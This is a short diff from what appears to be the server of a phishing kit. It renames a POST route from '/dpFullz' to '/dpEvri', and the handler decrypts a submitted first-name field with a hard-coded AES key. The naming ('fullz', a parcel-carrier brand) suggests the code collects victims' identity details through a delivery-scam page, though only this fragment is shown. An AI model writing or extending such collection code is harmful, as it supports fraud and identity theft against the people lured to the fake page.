@@ -12970,7 +12970,7 @@ let dpFullz = 0;
 
 app.options("/dpEvri", cors());
 
-app.post("/dpFullz", (req, res) => {
+app.post("/dpEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
     CryptoJS.enc.Utf8
   );
